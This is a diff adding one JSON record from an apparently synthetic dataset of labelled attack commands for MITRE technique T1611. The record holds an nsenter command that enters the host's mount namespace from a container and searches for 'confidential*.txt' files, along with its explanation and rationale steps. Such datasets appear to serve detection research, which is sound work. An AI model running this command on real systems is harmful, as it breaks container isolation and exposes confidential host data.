@@ -1,0 +1,21 @@
+{
+  "id": "SYN-BASH-T1611-227ea404-4a89b52c",
+  "technique_id": "T1611",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "nsenter --target 1 --mount -- bash -c 'find / -name \"confidential*.txt\"'",
+  "explanation": "Searches for files with confidential information by accessing the mount namespace of the host, leading to data discovery.",
+  "rationale_steps": [
+    "Gain direct access to host\u2019s filesystem through the mount namespace.",
+    "Execute a find command to locate sensitive or operational critical files based on naming conventions."
+  ],
+  "source_prompt_hash": "227ea404",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:30:03.527255Z"
+}
